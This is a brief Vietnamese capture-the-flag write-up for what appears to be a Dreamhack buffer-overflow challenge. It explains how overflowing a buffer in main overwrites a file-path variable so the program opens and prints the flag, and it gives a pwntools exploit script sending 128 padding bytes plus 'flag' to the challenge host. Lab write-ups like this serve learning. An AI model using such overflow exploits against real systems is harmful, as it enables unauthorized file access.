# Phân tích lỗi

<img width="647" height="325" alt="image" src="https://github.com/user-attachments/assets/1485ba95-1eff-4526-ba6a-6f84bd77d9cc" />

Buffer overflow ở hàm main có thể ghi đè tràn qua biến v5. Biến v5 sau đó sẽ được xử lí tiếp ở hàm read_cat.

<img width="795" height="602" alt="image" src="https://github.com/user-attachments/assets/cbca6ed3-9b99-48eb-ac21-3e3832818f30" />

Tại đây biến v5 được dùng để lấy đường dẫn file để mở file qua hàm `open()` và đọc vào s. Tận dụng điều này ta có thể ghi đè luôn đường dẫn file flag vào và đọc flag.
Hàm `print` sẽ làm nốt việc in flag ra màn hình.

    from pwn import *
    exe=ELF('./bof',checksec=False)
    p=remote('host3.dreamhack.games',9551)
    
    p.sendafter('meow? ',b'A'*128+b'flag\n')
    p.recvuntil(b'flag')
    
    p.interactive()

<img width="1452" height="350" alt="image" src="https://github.com/user-attachments/assets/08dd7e0e-41ba-4a27-b61a-60620f0db3c9" />

